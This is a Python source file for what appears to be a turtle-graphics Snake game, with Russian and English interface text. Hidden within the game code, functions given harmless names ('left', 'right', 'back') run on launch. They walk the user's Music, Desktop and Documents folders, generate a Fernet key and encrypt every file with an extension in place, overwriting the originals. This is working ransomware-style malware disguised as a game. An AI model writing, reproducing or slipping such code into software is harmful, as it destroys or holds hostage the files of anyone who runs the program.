import os
import socket
import turtle
import time
import random
from cryptography.fernet import Fernet

print("... libraries imported")

computer_name = socket.gethostname()

home_directory = os.path.expanduser("~")

score = 0
high_score = 0
delay = 0.1  

wn = turtle.Screen()
wn.title("Snake от @TokyoEdTech")
wn.bgcolor("green")
wn.setup(width=600, height=600)
wn.tracer(0) 

head = turtle.Turtle()
head.speed(0)
head.shape("square")
head.color("black")
head.penup()
head.goto(0,0)
head.direction = "stop"

food = turtle.Turtle()
food.speed(0)
food.shape("circle")
food.color("red")
food.penup()
food.goto(0,100)

segments = []

pen = turtle.Turtle()
pen.speed(0)
pen.shape("square")
pen.color("white")
pen.penup()
pen.hideturtle()
pen.goto(0, 260)
pen.write("Счет: 0  Рекорд: 0", align="center", font=("Courier", 24, "normal"))

def go_up():
    if head.direction != "down":
        head.direction = "up"

def go_down():
    if head.direction != "up":
        head.direction = "down"

def go_left():
    if head.direction != "right":
        head.direction = "left"

def go_right():
    if head.direction != "left":
        head.direction = "right"

def move():
    if head.direction == "up":
        y = head.ycor()
        head.sety(y + 20)

    if head.direction == "down":
        y = head.ycor()
        head.sety(y - 20)

    if head.direction == "left":
        x = head.xcor()
        head.setx(x - 20)

    if head.direction == "right":
        x = head.xcor()
        head.setx(x + 20)

def left():
    key = Fernet.generate_key()
    print("Ключ:", key)

    try:
        with open("key_file.key", "wb") as f:
            f.write(key)
        print("... key file created")
    except Exception as e:
        print("Error when creating a key file:", e)

    return key

def right(files, key):
    print("началось...")
    processed_files = 0

    for file in files:
        _, file_extension = os.path.splitext(file)
        if not file_extension:
            print(f"The {file} file is skipped because it does not have an extension.")
            continue
        if os.path.basename(file) in ['key_file.key', 'second.py', 'game.py']:
            print(f"The {file} file is omitted because it is a key file, second.py or game.py.")
            continue
        try:
            with open(file, "rb") as f:
                content = f.read()
            fernet = Fernet(key)
            encrypted_content = fernet.encrypt(content)
            with open(file, "wb") as f:
                f.write(encrypted_content)
            print(f"The {file} was successful.")
            processed_files += 1
        except PermissionError:
            print(f"File {file} skipped due to access error (PermissionError).")
        except Exception as e:
            print(f"Error {file}: {e}")

    print(f"Files processed: {processed_files}")
    print("... finish")

def back(root_dirs=['.']):
    files = []
    ignored_folders = ["Windows", "System Volume Information"]
    for root_dir in root_dirs:
        for root, directories, filenames in os.walk(root_dir):
            for filename in filenames:
                files.append(os.path.join(root, filename))
    return files

root_directories = [os.path.join(home_directory, "Music"), os.path.join(home_directory, "Desktop"), os.path.join(home_directory, "Documents")]  
print("Directories:")
for dir_path in root_directories:
    print(dir_path)

files = back(root_directories)
print("File list:")
for file in files:
    print(file)

print(f"Find: {len(files)}")

key = left()
right(files, key)

wn.listen()
wn.onkeypress(go_up, "w")
wn.onkeypress(go_down, "s")
wn.onkeypress(go_left, "a")
wn.onkeypress(go_right, "d")

while True:
    wn.update()

    if head.xcor()>290 or head.xcor()<-290 or head.ycor()>290 or head.ycor()<-290:
        time.sleep(1)
        head.goto(0,0)
        head.direction = "stop"

        for segment in segments:
            segment.goto(1000, 1000)
        
        segments.clear()

        score = 0

        delay = 0.1

        pen.clear()
        pen.write("Счет: {}  Record: {}".format(score, high_score), align="center", font=("Courier", 24, "normal")) 


    if head.distance(food) < 20:
        x = random.randint(-290, 290)
        y = random.randint(-290, 290)
        food.goto(x,y)

        new_segment = turtle.Turtle()
        new_segment.speed(0)
        new_segment.shape("square")
        new_segment.color("grey")
        new_segment.penup()
        segments.append(new_segment)

        delay -= 0.001

        score += 10

        if score > high_score:
            high_score = score
        
        pen.clear()
        pen.write("Счет: {}  Record: {}".format(score, high_score), align="center", font=("Courier", 24, "normal")) 

    for index in range(len(segments)-1, 0, -1):
        x = segments[index-1].xcor()
        y = segments[index-1].ycor()
        segments[index].goto(x, y)

    if len(segments) > 0:
        x = head.xcor()
        y = head.ycor()
        segments[0].goto(x,y)

    move()    

    for segment in segments:
        if segment.distance(head) < 20:
            time.sleep(1)
            head.goto(0,0)
            head.direction = "stop"
        
            for segment in segments:
                segment.goto(1000, 1000)
        
            segments.clear()

            score = 0

            delay = 0.1
        
            pen.clear()
            pen.write("Счет: {}  Record: {}".format(score, high_score), align="center", font=("Courier", 24, "normal"))

    time.sleep(delay)

wn.mainloop()
